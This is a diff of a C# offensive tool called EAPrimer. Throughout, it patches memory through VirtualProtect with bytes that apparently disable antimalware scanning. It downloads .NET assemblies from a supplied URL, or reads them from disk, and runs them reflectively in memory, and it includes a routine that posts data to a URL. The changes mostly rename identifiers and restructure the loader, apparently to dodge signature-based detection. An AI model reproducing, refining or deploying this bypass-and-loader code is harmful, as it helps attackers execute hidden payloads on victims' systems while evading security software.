@@ -11,18 +11,19 @@ namespace EAPrimer
     public class Program
     {
         [DllImport("kernel32")]
-        private static extern IntPtr LoadLibrary(string G2fnKHkbz5Ab);
+        private static extern IntPtr LoadLibrary(string BdaFefh34d);
 
         [DllImport("kernel32")]
-        private static extern IntPtr GetProcAddress(IntPtr Tvsas, string GHKPCKME);
+        private static extern IntPtr GetProcAddress(IntPtr Tvsas, string VO0olaeq);
 
         [DllImport("kernel32")]
-        private static extern bool VirtualProtect(IntPtr fwmzpXgc, UIntPtr Jvcap, uint BnszP, out uint VSGeYhcbqdgQHCMH);
+        private static extern bool VirtualProtect(IntPtr fwmzpXgc, UIntPtr Jvcap, uint BnszP, out uint OtafheJdkw093D);
 
-        private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
+        private static void CopyData(byte[] datInfo, IntPtr MemVal, int placeHolderHere = 0)
         {
-            Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
+            Marshal.Copy(datInfo, placeHolderHere, MemVal, datInfo.Length);
         }
+
         private static void Dispatch()
         {
             try
@@ -34,17 +35,17 @@ namespace EAPrimer
 
                 if (System.Environment.Is64BitOperatingSystem)
                 {
-                    var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                    var BigBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
-                    VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
-                    CopyData(bigBoyBytes, addr);
+                    VirtualProtect(addr, (UIntPtr)BigBytes.Length, magicRastaValue, out someNumber);
+                    CopyData(BigBytes, addr);
                 }
                 else
                 {
-                    var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+                    var SmallBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
-                    VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
-                    CopyData(smallBoyBytes, addr);
+                    VirtualProtect(addr, (UIntPtr)SmallBytes.Length, magicRastaValue, out someNumber);
+                    CopyData(SmallBytes, addr);
 
                 }
             }
@@ -54,7 +55,7 @@ namespace EAPrimer
             }
         }
 
-        static string Decoder(string bait, string snowgrant)
+        private static string Decoder(string bait, string snowgrant)
         {
             string moderncircle = bait;
             for (int i = 0; i < snowgrant.Length; i++)
@@ -64,7 +65,7 @@ namespace EAPrimer
             return moderncircle;
         }
 
-        static string Encoder(string casper, string reactor)
+        private static string Encoder(string casper, string reactor)
         {
             string weaver = casper;
             for (int i = 0; i < reactor.Length; i++)
@@ -74,14 +75,7 @@ namespace EAPrimer
             return weaver;
         }
 
-            static void ExecuteAssembly(string b64Assembly, string[] arguments)
-        {
-            var bytes = Convert.FromBase64String(b64Assembly);
-            var target = Assembly.Load(bytes).EntryPoint;
-            target.Invoke(null, new object[] { arguments });
-        }
-
-        static void PostData(string URL, string postData)
+        private static void PostData(string URL, string postData)
         {
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -91,7 +85,7 @@ namespace EAPrimer
             wc.UploadString(URL, "POST", postData);
         }
 
-        static byte[] GetAssembly(string URL)
+        private static byte[] GetAssembly(string URL)
         {
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
@@ -100,7 +94,7 @@ namespace EAPrimer
             return wc.DownloadData(URL);
         }
 
-        static Dictionary<string, string> ParseArgs(string[] args)
+        private static Dictionary<string, string> ParseArgs(string[] args)
         {
             var arguments = new Dictionary<string, string>();
             foreach (var argument in args)
@@ -116,6 +110,21 @@ namespace EAPrimer
                 }
             }
             return arguments;
+        }
+
+        private static void mainLine(byte[] assemblyBytes, object[] Addons)
+        {
+            getEntry(loadASM(assemblyBytes)).Invoke(null, Addons);
+        }
+
+        private static Assembly loadASM(byte[] assemblyBytes)
+        {
+            return Assembly.Load(assemblyBytes);
+        }
+
+        private static MethodInfo getEntry(Assembly asmobj)
+        {
+            return asmobj.EntryPoint;
         }
 
         public static void Main(string[] args)
@@ -163,7 +172,7 @@ namespace EAPrimer
                         if (arguments["-path"].StartsWith("http://") || arguments["-path"].StartsWith("https://"))
                         {
                             Console.WriteLine("[*] Loading Asembly: {0}", arguments["-path"]);
-                            assemblyBytes = assemblyBytes = GetAssembly(arguments["-path"]);
+                            assemblyBytes = GetAssembly(arguments["-path"]);
                         }
                         else
                         {
@@ -171,8 +180,7 @@ namespace EAPrimer
                             assemblyBytes = File.ReadAllBytes(arguments["-path"]);
                         }
 
-                        b64Assembly = Convert.ToBase64String(assemblyBytes);
-                        ExecuteAssembly(b64Assembly, assemblyArgs);
+                        mainLine(assemblyBytes, new object[] { assemblyArgs });
                     }
                 }
                 catch (Exception ex)
